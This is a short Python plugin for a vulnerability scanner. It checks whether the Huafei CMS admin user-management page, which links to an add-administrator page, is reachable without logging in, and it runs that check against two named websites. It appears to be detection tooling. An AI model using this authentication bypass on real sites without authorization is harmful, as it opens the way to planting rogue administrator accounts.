#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:华飞科技建站系统禁用js可以访问后台可以添加管理
#Refer:http://www.wooyun.org/bugs/wooyun-2010-083888

def assign(service,arg):
    if service=="huaficms":
        return True,arg 
    


def  audit(arg):
    url=arg+"admin/User/manageadmin.aspx"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'addadmin.aspx' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('huaficms','http://www.huafi.com/')[1])
    audit(assign('huaficms','http://www.hggfj.com/')[1])